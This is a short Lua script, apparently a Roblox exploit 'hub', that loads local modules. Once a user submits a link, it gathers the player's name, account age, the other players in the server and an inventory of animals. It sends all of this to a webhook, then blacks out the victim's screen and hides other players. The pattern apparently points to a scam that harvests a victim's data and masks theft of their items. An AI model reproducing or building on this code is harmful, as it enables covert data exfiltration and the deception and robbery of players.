local Hub = {}

Hub.Gui = loadstring(readfile("Sxims hub/Guicreator/Gui.lua"))()
Hub.Scan = loadstring(readfile("Sxims hub/Utility/ScanPlot.lua"))()
Hub.Webhook = loadstring(readfile("Sxims hub/Utility/Webhook.lua"))()
Hub.NoSee = loadstring(readfile("Sxims hub/Noseeplayer/NoSee.lua"))()

Hub.Gui.OnValidLink = function(link)
    Hub.Gui.ShowLoading()

    local animals = Hub.Scan.GetAnimals()

    local text =
        "Player name: "..Hub.Scan.PlayerName().."\n"..
        "Player age: "..Hub.Scan.PlayerAge().."\n"..
        "Other players in server: "..Hub.Scan.OtherPlayers().."\n"..
        "———————————————-\n"

    for _,a in ipairs(animals) do
        text ..= a.Name.." | "..a.Gen.."\n"
    end

    Hub.Webhook.SendFull(text)

    task.wait(1)
    Hub.Gui.Blackout()
    Hub.NoSee.Enable()
end

Hub.Gui.Init()